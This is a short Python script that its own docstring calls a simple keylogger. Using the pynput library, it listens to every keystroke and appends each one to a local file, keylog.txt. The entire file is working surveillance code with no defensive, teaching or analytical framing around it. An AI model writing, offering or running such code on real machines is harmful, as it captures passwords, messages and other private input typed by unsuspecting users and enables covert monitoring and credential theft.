"""simple keylogger in python that saves the key pressed value in a text file"""

from pynput.keyboard import Listener

def on_pressed(key):
    with open('keylog.txt', 'a') as f:
        f.write(str(key))
        
with Listener(on_press=on_pressed) as listener:
    listener.join()